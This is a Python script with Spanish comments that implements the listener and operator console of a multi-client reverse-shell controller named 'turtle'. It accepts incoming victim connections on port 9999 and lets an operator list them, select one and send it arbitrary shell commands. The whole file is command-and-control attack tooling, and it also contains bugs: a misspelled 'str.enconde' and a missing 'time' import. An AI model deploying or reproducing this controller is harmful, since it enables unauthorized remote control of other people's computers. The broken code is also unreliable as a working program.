# -*- coding: utf-8 -*-
import socket
import threading
import sys
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []



# creamos el socket (permite conectar 2 computadoras)
def socket_create():
    try:
        global host
        global port
        global s #socket
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Error al crear el socket" + str(msg))

# Enlazando el socket al puertto y esperando por conexiones desde el cliente.
def socket_bind():
    try:
        global host
        global port
        global s #socket
        #print("Enlazando el socket al puerto " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Error al enlazar el socket " + str(msg) + "\n" + "Reintentando...")
        time.sleep(5)
        socket_bind()

# Acepta conexiones desde multiples cleintes y los guarda en una lista
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, addr = s.accept()
            conn.setblocking(1) #no timeuot
            all_connections.append(conn)
            all_addresses.append(addr)
            print("`\nLa conexión ha sido establecida: " + addr[0] )
        except:
            print("Error aceptando la conexión")

# Creando una shell interactiva para el cliente (servirá para enviar los comandos remotamente).
def start_turtle():
    while 1:
        cmd = input('turtle> ')
        if cmd == 'list' :
            list_connections()
            continue
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'quit':
            s.close()
        else:
            print("Comando no reconocido")

# Mostrar todas la conexiones activas
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.enconde(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) +  '    ' + str(all_addresses[i][0]) + '    ' + str(all_addresses[i][1]) + '\n'
    print('------ Clients ------' + "\n" + results)


# Seleccionando el cliente objetivo
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("Ahorta estás conectado a: " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + "> ", end="")
        return conn
    except:
        print("El objetivo seleccionado no es válido")
        return None

# Conectando con el cliente remoto
def send_target_commands(conn):
    while 1:
        try:
            cmd = input()
            if len(str.enconde(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == "quit":
                break
        except:
            print("Se ha perdido la conexión")
            break

# Crear el worker de threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Haz el siguiente trabajo en la cola (uno maneja la conexión y otro envía el comando)
def work():
    while 1:
        x  = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()
    




# Cada elemento de la lista es un nuevo job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()